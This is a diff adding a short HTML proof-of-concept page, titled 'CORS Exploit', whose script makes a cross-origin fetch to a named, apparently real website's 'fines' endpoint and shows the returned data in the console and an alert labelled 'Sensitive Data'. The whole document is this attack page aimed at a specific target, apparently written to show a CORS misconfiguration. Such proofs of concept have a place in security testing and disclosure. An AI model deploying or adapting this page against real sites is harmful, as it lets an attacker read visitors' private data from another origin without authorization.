@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Exploit</title>
+</head>
+<body>
+    <h1>PoC: Exploiting CORS</h1>
+    <script>
+        fetch("https://justonweb.be/fines", {
+            method: "GET",
+            mode: "cors",
+            headers: {
+                "Content-Type": "application/json",
+            },
+        })
+            .then(response => response.text())
+            .then(data => {
+                console.log("Exploited Data:", data);
+                alert("Sensitive Data: " + data);
+            })
+            .catch(error => console.error("Error:", error));
+    </script>
+</body>
+</html>
